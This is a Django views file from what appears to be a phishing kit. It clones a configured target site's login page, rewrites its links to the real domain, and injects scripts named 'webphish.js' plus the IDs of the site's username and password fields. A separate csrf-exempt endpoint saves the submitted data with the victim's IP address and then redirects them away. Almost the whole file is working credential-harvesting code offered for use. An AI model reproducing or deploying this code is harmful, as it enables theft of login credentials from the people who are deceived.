from django.shortcuts import redirect, render, HttpResponse
from django.views.decorators.csrf import csrf_exempt
import requests,json
from urllib.parse import urlparse
from . models import Target,Data
# Create your views here.

def index(request):
    target = Target.objects.first()
    if target == None:
        return redirect("/admin")

    resp = requests.get(target.url)
    html = resp.text.replace('''"/''',f'''"https://{urlparse(target.url).netloc}/''')


    pyload_head = '''<script src="/static/jq.js" defer></script>
    <script src="/static/webphish.js" defer></script>'''

    pyload_body = f'''
    <script>
    var form_id = "#{target.form_id}"
    var btn_id = "#{target.btn_id}"
    var username_id_or_name = "#{target.username_id_name}"
    var password_id_or_name = "#{target.password_id_name}"
    </script>
    '''
    head_tag = html.find("<head>")
    html = html[:head_tag+7] + pyload_head + html[head_tag+7:]

    body_tag = html.find("</body>")
    html = html[:body_tag] + pyload_body + html[body_tag:]

    return HttpResponse(html)


@csrf_exempt
def save_data(request):
    if request.method == 'POST':
        data = request.POST.get("data")
        data_obj = Data(
            url = Target.objects.first().url,
            data = data,
            ip = request.META['REMOTE_ADDR'],
        )
        data_obj.save()
    # return HttpResponse("{'status':'"+Target.objects.first().redirect_url+"'}")
    return redirect("https://example.com/")

